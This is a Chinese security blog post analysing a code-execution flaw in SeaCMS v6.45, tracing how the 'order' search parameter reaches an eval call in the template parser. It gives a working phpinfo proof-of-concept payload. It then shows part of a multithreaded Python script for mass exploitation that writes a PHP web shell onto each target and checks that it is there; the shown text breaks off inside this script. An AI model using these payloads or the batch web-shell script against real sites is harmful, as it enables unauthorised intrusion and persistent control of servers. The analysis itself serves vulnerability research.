<!DOCTYPE html>
<html lang="en">

<head>
    
<meta charset="utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">


<title>SeaCMS v6.45前台Getshell 代码执行漏洞(每日一洞) - F0rmat的博客 | 专注于网络攻防和信息安全</title>

<meta name="description" content="前言 昨晚审计到了三点，今天还要整理宿舍就没有写文章。这个CMS没有用框架，漏洞的执行过程我看了很久才看完，下面就写漏洞执行过程和POC构造还有用Python编写批量Getshell脚本。
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
漏洞代码执行过程分析 先看一下这个代码是一个怎么执行的吧，我画了一个流程图，有点简陋，不过如果真的要深入了解一定要亲自去看一遍代码才行。 漏洞详情 漏洞代码执行 Payload代码 http://seacms.test/search.php POST:searchtype=5&amp;amp;order=}{end if} {if:1)phpinfo();if(1}{end if}
执行结果 分析过程  漏洞的触发点是在search.php 中的echoSearchPage()函数可以触发漏洞。常规的分析都是先找GET、POST的位置，在这个文件里面没有这些变量，原来是在./include/common.php里面。  if(PHP_VERSION &amp;lt; &amp;#39;4.1.0&amp;#39;) { $_GET = &amp;amp;$HTTP_GET_VARS; $_POST = &amp;amp;$HTTP_POST_VARS; $_COOKIE = &amp;amp;$HTTP_COOKIE_VARS; $_SERVER = &amp;amp;$HTTP_SERVER_VARS; $_ENV = &amp;amp;$HTTP_ENV_VARS; $_FILES = &amp;amp;$HTTP_POST_FILES; } ...... foreach(Array(&amp;#39;_GET&amp;#39;,&amp;#39;_POST&amp;#39;,&amp;#39;_COOKIE&amp;#39;) as $_request) { foreach($$_request as $_k =&amp;gt; $_v) ${$_k} = _RunMagicQuotes($_v); } 所以Payload用GET还是POST都是可以的。" /><meta name="keywords"
  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />


<link rel="stylesheet" href="https://getshe11.com/css/main.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">



<meta property="og:title" content="SeaCMS v6.45前台Getshell 代码执行漏洞(每日一洞)" />
<meta property="og:description" content="前言 昨晚审计到了三点，今天还要整理宿舍就没有写文章。这个CMS没有用框架，漏洞的执行过程我看了很久才看完，下面就写漏洞执行过程和POC构造还有用Python编写批量Getshell脚本。
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
漏洞代码执行过程分析 先看一下这个代码是一个怎么执行的吧，我画了一个流程图，有点简陋，不过如果真的要深入了解一定要亲自去看一遍代码才行。 漏洞详情 漏洞代码执行 Payload代码 http://seacms.test/search.php POST:searchtype=5&amp;order=}{end if} {if:1)phpinfo();if(1}{end if}
执行结果 分析过程  漏洞的触发点是在search.php 中的echoSearchPage()函数可以触发漏洞。常规的分析都是先找GET、POST的位置，在这个文件里面没有这些变量，原来是在./include/common.php里面。  if(PHP_VERSION &lt; &#39;4.1.0&#39;) { $_GET = &amp;$HTTP_GET_VARS; $_POST = &amp;$HTTP_POST_VARS; $_COOKIE = &amp;$HTTP_COOKIE_VARS; $_SERVER = &amp;$HTTP_SERVER_VARS; $_ENV = &amp;$HTTP_ENV_VARS; $_FILES = &amp;$HTTP_POST_FILES; } ...... foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request) { foreach($$_request as $_k =&gt; $_v) ${$_k} = _RunMagicQuotes($_v); } 所以Payload用GET还是POST都是可以的。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://getshe11.com/post/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/" />
<meta property="article:published_time" content="2018-03-02T19:28:36+00:00" />
<meta property="article:modified_time" content="2018-03-02T19:28:36+00:00" />
<meta itemprop="name" content="SeaCMS v6.45前台Getshell 代码执行漏洞(每日一洞)">
<meta itemprop="description" content="前言 昨晚审计到了三点，今天还要整理宿舍就没有写文章。这个CMS没有用框架，漏洞的执行过程我看了很久才看完，下面就写漏洞执行过程和POC构造还有用Python编写批量Getshell脚本。
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
漏洞代码执行过程分析 先看一下这个代码是一个怎么执行的吧，我画了一个流程图，有点简陋，不过如果真的要深入了解一定要亲自去看一遍代码才行。 漏洞详情 漏洞代码执行 Payload代码 http://seacms.test/search.php POST:searchtype=5&amp;order=}{end if} {if:1)phpinfo();if(1}{end if}
执行结果 分析过程  漏洞的触发点是在search.php 中的echoSearchPage()函数可以触发漏洞。常规的分析都是先找GET、POST的位置，在这个文件里面没有这些变量，原来是在./include/common.php里面。  if(PHP_VERSION &lt; &#39;4.1.0&#39;) { $_GET = &amp;$HTTP_GET_VARS; $_POST = &amp;$HTTP_POST_VARS; $_COOKIE = &amp;$HTTP_COOKIE_VARS; $_SERVER = &amp;$HTTP_SERVER_VARS; $_ENV = &amp;$HTTP_ENV_VARS; $_FILES = &amp;$HTTP_POST_FILES; } ...... foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request) { foreach($$_request as $_k =&gt; $_v) ${$_k} = _RunMagicQuotes($_v); } 所以Payload用GET还是POST都是可以的。">
<meta itemprop="datePublished" content="2018-03-02T19:28:36+00:00" />
<meta itemprop="dateModified" content="2018-03-02T19:28:36+00:00" />
<meta itemprop="wordCount" content="310">



<meta itemprop="keywords" content="漏洞,代码审计,php,SeaCMS,getshell," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SeaCMS v6.45前台Getshell 代码执行漏洞(每日一洞)"/>
<meta name="twitter:description" content="前言 昨晚审计到了三点，今天还要整理宿舍就没有写文章。这个CMS没有用框架，漏洞的执行过程我看了很久才看完，下面就写漏洞执行过程和POC构造还有用Python编写批量Getshell脚本。
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
漏洞代码执行过程分析 先看一下这个代码是一个怎么执行的吧，我画了一个流程图，有点简陋，不过如果真的要深入了解一定要亲自去看一遍代码才行。 漏洞详情 漏洞代码执行 Payload代码 http://seacms.test/search.php POST:searchtype=5&amp;order=}{end if} {if:1)phpinfo();if(1}{end if}
执行结果 分析过程  漏洞的触发点是在search.php 中的echoSearchPage()函数可以触发漏洞。常规的分析都是先找GET、POST的位置，在这个文件里面没有这些变量，原来是在./include/common.php里面。  if(PHP_VERSION &lt; &#39;4.1.0&#39;) { $_GET = &amp;$HTTP_GET_VARS; $_POST = &amp;$HTTP_POST_VARS; $_COOKIE = &amp;$HTTP_COOKIE_VARS; $_SERVER = &amp;$HTTP_SERVER_VARS; $_ENV = &amp;$HTTP_ENV_VARS; $_FILES = &amp;$HTTP_POST_FILES; } ...... foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request) { foreach($$_request as $_k =&gt; $_v) ${$_k} = _RunMagicQuotes($_v); } 所以Payload用GET还是POST都是可以的。"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->
</head>

<body>
    <div class="header-placeholder"></div>
    
    <header class="header">
        <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    
    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
    
    <nav class="site-nav">
        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
    </nav>
</div>

    </header>

    
    <div class="page-content">
        <div class="wrapper">
            
            <div class="col-main">
                <div class="post">
    
    <header class="post-header">
        <h1 class="post-title">SeaCMS V6.45前台Getshell 代码执行漏洞(每日一洞)</h1>
        <p class="post-meta">Mar 02, 2018</p>
    </header>
    <article class="post-content">
        
        
        
        
        
        
        <h1 id="前言">前言</h1>
<p>昨晚审计到了三点，今天还要整理宿舍就没有写文章。这个CMS没有用框架，漏洞的执行过程我看了很久才看完，下面就写漏洞执行过程和POC构造还有用Python编写批量Getshell脚本。</p>
<h1 id="环境">环境</h1>
<p><strong>Web：</strong> phpstudy
<strong>System：</strong> Windows 10 X64
<strong>Browser：</strong> Firefox Quantum
<strong>Python version ：</strong> 2.7</p>
<h1 id="漏洞代码执行过程分析">漏洞代码执行过程分析</h1>
<p>先看一下这个代码是一个怎么执行的吧，我画了一个流程图，有点简陋，不过如果真的要深入了解一定要亲自去看一遍代码才行。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_order_liucheng.png" alt=""></p>
<h1 id="漏洞详情">漏洞详情</h1>
<h2 id="漏洞代码执行">漏洞代码执行</h2>
<h3 id="payload代码">Payload代码</h3>
<p><code>http://seacms.test/search.php</code>
POST:<code>searchtype=5&amp;order=}{end if} {if:1)phpinfo();if(1}{end if}</code></p>
<!-- raw HTML omitted -->
<h3 id="执行结果">执行结果</h3>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms1.png" alt=""></p>
<h2 id="分析过程">分析过程</h2>
<ul>
<li>漏洞的触发点是在<code>search.php</code> 中的<code>echoSearchPage()</code>函数可以触发漏洞。常规的分析都是先找<code>GET</code>、<code>POST</code>的位置，在这个文件里面没有这些变量，原来是在<code>./include/common.php</code>里面。</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="k">PHP_VERSION</span> <span class="o">&lt;</span> <span class="s1">&#39;4.1.0&#39;</span><span class="p">)</span> <span class="p">{</span>
	<span class="nv">$_GET</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$HTTP_GET_VARS</span><span class="p">;</span>
	<span class="nv">$_POST</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$HTTP_POST_VARS</span><span class="p">;</span>
	<span class="nv">$_COOKIE</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$HTTP_COOKIE_VARS</span><span class="p">;</span>
	<span class="nv">$_SERVER</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$HTTP_SERVER_VARS</span><span class="p">;</span>
	<span class="nv">$_ENV</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$HTTP_ENV_VARS</span><span class="p">;</span>
	<span class="nv">$_FILES</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$HTTP_POST_FILES</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">......</span>
<span class="k">foreach</span><span class="p">(</span><span class="k">Array</span><span class="p">(</span><span class="s1">&#39;_GET&#39;</span><span class="p">,</span><span class="s1">&#39;_POST&#39;</span><span class="p">,</span><span class="s1">&#39;_COOKIE&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$_request</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">foreach</span><span class="p">(</span><span class="nv">$$_request</span> <span class="k">as</span> <span class="nv">$_k</span> <span class="o">=&gt;</span> <span class="nv">$_v</span><span class="p">)</span> <span class="nv">${$_k}</span> <span class="o">=</span> <span class="nx">_RunMagicQuotes</span><span class="p">(</span><span class="nv">$_v</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>所以Payload用GET还是POST都是可以的。</p>
<ul>
<li>由于代码太多就例举主要的代码段分析，继续回到<code>search.php</code>里面的<code>echoSearchPage()</code>函数。
第一句是把这些变量设置为全局变量，方便下面来传值。
第二句是判断<code>$order</code>是否为空，如果为空就把<code>time</code>赋值给$order。</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">global</span> <span class="nv">$dsql</span><span class="p">,</span><span class="nv">$cfg_iscache</span><span class="p">,</span><span class="nv">$mainClassObj</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="nv">$t1</span><span class="p">,</span><span class="nv">$cfg_search_time</span><span class="p">,</span><span class="nv">$searchtype</span><span class="p">,</span><span class="nv">$searchword</span><span class="p">,</span><span class="nv">$tid</span><span class="p">,</span><span class="nv">$year</span><span class="p">,</span><span class="nv">$letter</span><span class="p">,</span><span class="nv">$area</span><span class="p">,</span><span class="nv">$yuyan</span><span class="p">,</span><span class="nv">$state</span><span class="p">,</span><span class="nv">$ver</span><span class="p">,</span><span class="nv">$order</span><span class="p">,</span><span class="nv">$jq</span><span class="p">,</span><span class="nv">$money</span><span class="p">,</span><span class="nv">$cfg_basehost</span><span class="p">;</span>
	<span class="nv">$order</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$order</span><span class="p">)</span><span class="o">?</span><span class="nv">$order</span><span class="o">:</span><span class="nx">time</span><span class="p">;</span>
</code></pre></div><ul>
<li>这段是<code>Payload</code>的里面一个重要的参数<code>$searchtype</code>的代码，一定要赋值<code>5</code>，可以到看到等于<code>5</code>的时候就有<code>$order</code>变量，所以我们要传<code>$order</code>进去就赋值<code>5</code>，至于为什么要赋值给<code>$order</code>，先跟着代码执行下去自然就会明白了。
这里还有一个点，就是第四行的<code>$pSize</code>这里是选择模版文件，就是为了接下来使用<code>str_replace</code>函数对这个模版文件的内容进行替换。
替换内容的文件在<code>\data\cache</code>里面，下面是文件的位置。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms2.png" alt=""></li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$searchtype</span><span class="p">)</span><span class="o">==</span><span class="mi">5</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="nv">$searchTemplatePath</span> <span class="o">=</span> <span class="s2">&#34;/templets/&#34;</span><span class="o">.</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cfg_df_style&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cfg_df_html&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;/cascade.html&#34;</span><span class="p">;</span>
		<span class="nv">$typeStr</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$tid</span><span class="p">)</span><span class="o">?</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$tid</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">:</span><span class="s1">&#39;0_&#39;</span><span class="p">;</span>
		<span class="nv">$yearStr</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$year</span><span class="p">)</span><span class="o">?</span><span class="nx">PinYin</span><span class="p">(</span><span class="nv">$year</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">:</span><span class="s1">&#39;0_&#39;</span><span class="p">;</span>
		<span class="nv">$letterStr</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$letter</span><span class="p">)</span><span class="o">?</span><span class="nv">$letter</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">:</span><span class="s1">&#39;0_&#39;</span><span class="p">;</span>
		<span class="nv">$areaStr</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$area</span><span class="p">)</span><span class="o">?</span><span class="nx">PinYin</span><span class="p">(</span><span class="nv">$area</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">:</span><span class="s1">&#39;0_&#39;</span><span class="p">;</span>
		<span class="nv">$orderStr</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$order</span><span class="p">)</span><span class="o">?</span><span class="nv">$order</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">:</span><span class="s1">&#39;0_&#39;</span><span class="p">;</span>
		<span class="nv">$jqStr</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$jq</span><span class="p">)</span><span class="o">?</span><span class="nv">$jq</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">:</span><span class="s1">&#39;0_&#39;</span><span class="p">;</span>
		<span class="nv">$cacheName</span><span class="o">=</span><span class="s2">&#34;parse_cascade_&#34;</span><span class="o">.</span><span class="nv">$typeStr</span><span class="o">.</span><span class="nv">$yearStr</span><span class="o">.</span><span class="nv">$letterStr</span><span class="o">.</span><span class="nv">$areaStr</span><span class="o">.</span><span class="nv">$orderStr</span><span class="p">;</span>
		<span class="nv">$pSize</span> <span class="o">=</span> <span class="nx">getPageSizeOnCache</span><span class="p">(</span><span class="nv">$searchTemplatePath</span><span class="p">,</span><span class="s2">&#34;cascade&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
	<span class="p">}</span><span class="k">else</span>
	<span class="p">{</span>
		<span class="k">if</span><span class="p">(</span><span class="nv">$cfg_search_time</span><span class="o">&amp;&amp;</span><span class="nv">$page</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="nx">checkSearchTimes</span><span class="p">(</span><span class="nv">$cfg_search_time</span><span class="p">);</span>
		<span class="nv">$searchTemplatePath</span> <span class="o">=</span> <span class="s2">&#34;/templets/&#34;</span><span class="o">.</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cfg_df_style&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cfg_df_html&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;/search.html&#34;</span><span class="p">;</span>
		<span class="nv">$cacheName</span><span class="o">=</span><span class="s2">&#34;parse_search_&#34;</span><span class="p">;</span>
		<span class="nv">$pSize</span> <span class="o">=</span> <span class="nx">getPageSizeOnCache</span><span class="p">(</span><span class="nv">$searchTemplatePath</span><span class="p">,</span><span class="s2">&#34;search&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
	<span class="p">}</span>
<span class="nx">。。。。。。。中间有很多代码就不一一分析中间的了。</span>
	<span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:page}&#34;</span><span class="p">,</span><span class="nv">$page</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
	    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{seacms:searchword}&#34;</span><span class="p">,</span><span class="nv">$searchword</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
	<span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{seacms:searchnum}&#34;</span><span class="p">,</span><span class="nv">$TotalResult</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
	    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{searchpage:ordername}&#34;</span><span class="p">,</span><span class="nv">$order</span><span class="p">,</span><span class="nv">$content</span><span class="p">);</span>
</code></pre></div><ul>
<li>来到这里了，离构造POC又进一步了。我们只要的是看<code>parseIf</code>这个函数，在此之前我们可以先用<code>echo</code>来输出一下<code>$content</code>的内容，下面是对比图：</li>
</ul>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms3.png" alt=""></p>
<hr>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms4.png" alt=""></p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">        <span class="nv">$content</span><span class="o">=</span><span class="nv">$mainClassObj</span><span class="o">-&gt;</span><span class="na">parseIf</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
	<span class="nv">$content</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{seacms:member}&#34;</span><span class="p">,</span><span class="nx">front_member</span><span class="p">(),</span><span class="nv">$content</span><span class="p">);</span>
	<span class="nv">$searchPageStr</span> <span class="o">=</span> <span class="nv">$content</span><span class="p">;</span>
	<span class="k">echo</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{seacms:runinfo}&#34;</span><span class="p">,</span><span class="nx">getRunTime</span><span class="p">(</span><span class="nv">$t1</span><span class="p">),</span><span class="nv">$searchPageStr</span><span class="p">)</span> <span class="p">;</span>
</code></pre></div><ul>
<li>下面我们继续跟进<code>parseIf</code>这个函数,代码我就贴执行代码漏洞的地方。代码中用到一些不懂函数可以去PHP官网或者百度Google一下。
<code>$labelRule*</code>这些变量都是规则，<code>preg_match_all</code>函数就用到了第一个规则<code>{if:(.*?)}(.*?){end if}</code>。
有很多新手估计要看很久才能看得懂这段正则，我在这里稍微解释一下，{if:<strong>(.<em>?)}(.</em>?)</strong>{end if}，除了加粗部分是一定要符合{if:}{end if},中间的<code>(.*?)</code>是用了贪婪的模式，它把匹配到的赋值到一个数组<code>$iar</code>里面，大家可以输入一下这个数组：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms5.png" alt=""><br>
大家发现了吗，变量<code>$order</code>的值也在里面，所以我们为什么要用<code>order</code>这个函数写入要执行的代码了。
来看这一句<code>	if (strpos($strThen,$labelRule2)===false){</code>判断<code>strpos</code>返回是否为假就执行下面的代码，我们来输出下<code>$strThen</code>到底有没有这个<code>$labelRule2</code>变量的内容。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms6.png" alt="">
可以看到是没有的，所以会执行下面的代码，<code>if (strpos($strThen,$labelRule3)&gt;=0){</code>这个判断从上面输出就可以看到有这个内容，所以为真执行下面的代码。
下面三句代码就不用看了，因为重要的是<code>@eval(&quot;if(&quot;.$strIf.&quot;){\$ifFlag=true;}else{\$ifFlag=false;}&quot;);</code>里面的<code>$strIf</code>变量也就是数组$iar[1]数组<code>$iar[1]</code>里面的内容。我们继续输出一下这个数组里面的内容。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms7.png" alt="">
这里可以看出<code>eval</code>执行的变量是<code>$strIf</code>，而<code>$strIf</code>又有<code>$order</code>，所以这里又再一次解释为什么要用<code>order</code>参数</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">	<span class="k">function</span> <span class="nf">parseIf</span><span class="p">(</span><span class="nv">$content</span><span class="p">){</span>
		<span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="s1">&#39;{if:&#39;</span><span class="p">)</span><span class="o">===</span> <span class="k">false</span><span class="p">){</span>
		<span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
		<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="nv">$labelRule</span> <span class="o">=</span> <span class="nx">buildregx</span><span class="p">(</span><span class="s2">&#34;{if:(.*?)}(.*?){end if}&#34;</span><span class="p">,</span><span class="s2">&#34;is&#34;</span><span class="p">);</span>
		<span class="nv">$labelRule2</span><span class="o">=</span><span class="s2">&#34;{elseif&#34;</span><span class="p">;</span>
		<span class="nv">$labelRule3</span><span class="o">=</span><span class="s2">&#34;{else}&#34;</span><span class="p">;</span>
		<span class="nx">preg_match_all</span><span class="p">(</span><span class="nv">$labelRule</span><span class="p">,</span><span class="nv">$content</span><span class="p">,</span><span class="nv">$iar</span><span class="p">);</span>
		<span class="nv">$arlen</span><span class="o">=</span><span class="nx">count</span><span class="p">(</span><span class="nv">$iar</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
		<span class="nv">$elseIfFlag</span><span class="o">=</span><span class="k">false</span><span class="p">;</span>
		<span class="k">for</span><span class="p">(</span><span class="nv">$m</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$m</span><span class="o">&lt;</span><span class="nv">$arlen</span><span class="p">;</span><span class="nv">$m</span><span class="o">++</span><span class="p">){</span>
			<span class="nv">$strIf</span><span class="o">=</span><span class="nv">$iar</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$m</span><span class="p">];</span>
			<span class="nv">$strIf</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseStrIf</span><span class="p">(</span><span class="nv">$strIf</span><span class="p">);</span>
			<span class="nv">$strThen</span><span class="o">=</span><span class="nv">$iar</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="nv">$m</span><span class="p">];</span>
			<span class="nv">$strThen</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseSubIf</span><span class="p">(</span><span class="nv">$strThen</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$strThen</span><span class="p">,</span><span class="nv">$labelRule2</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">){</span>
				<span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$strThen</span><span class="p">,</span><span class="nv">$labelRule3</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">){</span>
					<span class="nv">$elsearray</span><span class="o">=</span><span class="nx">explode</span><span class="p">(</span><span class="nv">$labelRule3</span><span class="p">,</span><span class="nv">$strThen</span><span class="p">);</span>
					<span class="nv">$strThen1</span><span class="o">=</span><span class="nv">$elsearray</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
					<span class="nv">$strElse1</span><span class="o">=</span><span class="nv">$elsearray</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
                    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s2">&#34;if(&#34;</span><span class="o">.</span><span class="nv">$strIf</span><span class="o">.</span><span class="s2">&#34;){</span><span class="se">\$</span><span class="s2">ifFlag=true;}else{</span><span class="se">\$</span><span class="s2">ifFlag=false;}&#34;</span><span class="p">);</span>
</code></pre></div><h3 id="构造poc">构造POC</h3>
<p>又到构造POC这一步骤了，经过上面的分析，我们可以很清晰地构造出POC了。
<code> {if:&quot;{searchpage:ordername}&quot;==&quot;time&quot;}</code>替换模版文件里面内容
<code>{if:(.*?)}(.*?){end if}</code>匹配规则
<code>@eval(&quot;if(&quot;.$strIf.&quot;){\$ifFlag=true;}else{\$ifFlag=false;}&quot;)</code>代码执行</p>
<p>我们传入的<code>order</code>要放在<code>{searchpage:ordername}</code>这里,所以我们要闭合前面的标签，<code>}{end if}</code>这句就可以闭合前面的标签， 为什么要闭合，因为程序的<code>{if:}{end if}</code>也是会解析成PHP的代码，如果不闭合就会出错不执行我们的代码。</p>
<p>过了这一关后，就到匹配规则了，只要符合<code>{if:}{end if}</code>就行了。我们要在<code>{if:(.*?)}</code>里面的<code>(.*?)</code>才会传入<code>$strIf</code>变量，继续看下面。</p>
<p>最后一关就是闭合<code>if(&quot;.$strIf.&quot;)</code>，加入这一句<code>1)phpinfo();if(1</code>就OK了</p>
<p>代码执行的结果就是<code>@eval(&quot;if(1)phpinfo();if(1){\$ifFlag=true;}else{\$ifFlag=false;}&quot;)</code></p>
<p>所以我们的POC就是<code>}{end if} {if:1)phpinfo();if(1}{end if}</code></p>
<h2 id="用python编写批量getshell脚本">用Python编写批量Getshell脚本</h2>
<p>用了多线程，可以指定单目标或者批量。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.png" alt=""></p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="s1">&#39;&#39;&#39;
</span><span class="s1">author:F0rmat
</span><span class="s1">&#39;&#39;&#39;</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span> <span class="s2">&#34;-f&#34;</span><span class="p">:</span>
        <span class="n">target</span><span class="o">=</span><span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="o">+</span><span class="s2">&#34;/search.php&#34;</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;searchtype&#34;</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="s2">&#34;order&#34;</span><span class="p">:</span><span class="s2">&#34;}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&#34;</span><span class="p">,</span><span class="s2">&#34;func&#34;</span><span class="p">:</span><span class="s2">&#34;assert&#34;</span><span class="p">,</span><span class="s2">&#34;cmd&#34;</span><span class="p">:</span><span class="s2">&#34;fwrite(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[f0rmat])?&gt;f0rmat&#39;);&#34;</span><span class="p">}</span>
    <span class="n">shell</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="s1">&#39;/shell.php&#39;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">verify</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
